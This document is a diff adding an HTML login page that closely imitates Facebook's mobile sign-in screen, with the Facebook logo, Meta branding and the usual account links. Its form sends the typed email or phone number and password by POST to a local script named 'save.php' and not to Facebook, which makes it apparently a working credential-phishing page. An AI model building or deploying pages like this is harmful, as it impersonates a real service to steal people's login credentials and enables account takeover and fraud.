@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif;
+}
+
+body{
+background:#0f1d2b;
+height:100vh;
+display:flex;
+justify-content:center;
+color:white;
+}
+
+.container{
+width:100%;
+max-width:380px;
+display:flex;
+flex-direction:column;
+height:100vh;
+padding:18px;
+}
+
+/* TOP BAR */
+
+.topbar{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:40px;
+}
+
+.language{
+font-size:14px;
+color:#9aa6b2;
+}
+
+/* CENTER */
+
+.middle{
+flex:1;
+display:flex;
+flex-direction:column;
+justify-content:center;
+}
+
+/* LOGO */
+
+.logo{
+text-align:center;
+margin-bottom:35px;
+}
+
+.logo img{
+width:70px;
+}
+
+/* INPUT */
+
+.input-box{
+position:relative;
+margin-bottom:16px;
+}
+
+input{
+width:100%;
+padding:16px;
+border-radius:14px;
+border:1px solid #3a4a5a;
+background:#1b2a38;
+color:white;
+font-size:15px;
+outline:none;
+}
+
+input:focus{
+border-color:#1877f2;
+}
+
+input::placeholder{
+color:#9aa6b2;
+}
+
+/* INFO ICON */
+
+.info{
+position:absolute;
+right:12px;
+top:50%;
+transform:translateY(-50%);
+border:1px solid #9aa6b2;
+border-radius:50%;
+width:18px;
+height:18px;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:12px;
+color:#9aa6b2;
+}
+
+/* EYE */
+
+.toggle{
+position:absolute;
+right:12px;
+top:50%;
+transform:translateY(-50%);
+cursor:pointer;
+display:flex;
+}
+
+/* BUTTON */
+
+.login-btn{
+width:100%;
+padding:15px;
+border:none;
+border-radius:30px;
+background:#1877f2;
+color:white;
+font-size:16px;
+font-weight:600;
+margin-top:20px;
+cursor:pointer;
+}
+
+.forgot{
+display:block;
+margin-top:18px;
+text-align:center;
+color:#c0cad5;
+font-size:14px;
+text-decoration:none;
+}
+
+/* BOTTOM */
+
+.bottom{
+text-align:center;
+padding-bottom:15px;
+}
+
+.create{
+display:block;
+padding:14px;
+border-radius:30px;
+border:1px solid #1877f2;
+color:#1877f2;
+text-decoration:none;
+margin-bottom:12px;
+}
+
+/* META */
+
+.meta{
+display:flex;
+justify-content:center;
+align-items:center;
+gap:4px;
+color:#9aa6b2;
+font-size:14px;
+}
+
+.meta span:first-child{
+font-size:14px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- TOP -->
+<div class="topbar">
+
+<svg width="24" height="24" viewBox="0 0 24 24">
+<path d="M15 6L9 12L15 18" stroke="#9aa6b2" stroke-width="2"/>
+</svg>
+
+<div class="language">English (UK) ▼</div>
+
+<div></div>
+
+</div>
+
+<!-- CENTER FORM -->
+<div class="middle">
+
+<div class="logo">
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
+</div>
+
+<form action="save.php" method="POST">
+
+<div class="input-box">
+<input type="text" name="email" placeholder="Mobile number or email" required>
+<div class="info">i</div>
+</div>
+
+<div class="input-box">
+<input type="password" id="password" name="password"
+placeholder="Password" oninput="showEye()">
+
+<span class="toggle" id="eyeToggle" onclick="togglePassword()" style="display:none;">
+<svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+<path d="M1 12C3.5 7 7.5 4 12 4C16.5 4 20.5 7 23 12" stroke="#9aa6b2" stroke-width="2"/>
+<circle cx="12" cy="12" r="3" stroke="#9aa6b2" stroke-width="2"/>
+</svg>
+</span>
+
+</div>
+
+<button type="submit" class="login-btn">Log in</button>
+
+</form>
+
+<a class="forgot" href="#">Forgotten password?</a>
+
+</div>
+
+<!-- BOTTOM -->
+<div class="bottom">
+
+<a class="create" href="#">Create new account</a>
+
+<div class="meta">
+<span>∞</span>
+<span>Meta</span>
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+function showEye(){
+let pass = document.getElementById("password");
+let eye = document.getElementById("eyeToggle");
+
+eye.style.display = pass.value.length > 0 ? "flex" : "none";
+}
+
+function togglePassword(){
+
+let pass = document.getElementById("password");
+let eye = document.getElementById("eyeToggle");
+
+if(pass.type === "password"){
+pass.type = "text";
+
+eye.innerHTML = `
+<svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+<path d="M17.94 17.94L1 1" stroke="#9aa6b2" stroke-width="2"/>
+<path d="M1 12C3.5 7 7.5 4 12 4C16.5 4 20.5 7 23 12" stroke="#9aa6b2" stroke-width="2"/>
+</svg>`;
+
+}else{
+pass.type = "password";
+
+eye.innerHTML = `
+<svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+<path d="M1 12C3.5 7 7.5 4 12 4C16.5 4 20.5 7 23 12" stroke="#9aa6b2" stroke-width="2"/>
+<circle cx="12" cy="12" r="3" stroke="#9aa6b2" stroke-width="2"/>
+</svg>`;
+}
+
+}
+
+</script>
+
+</body>
+</html>
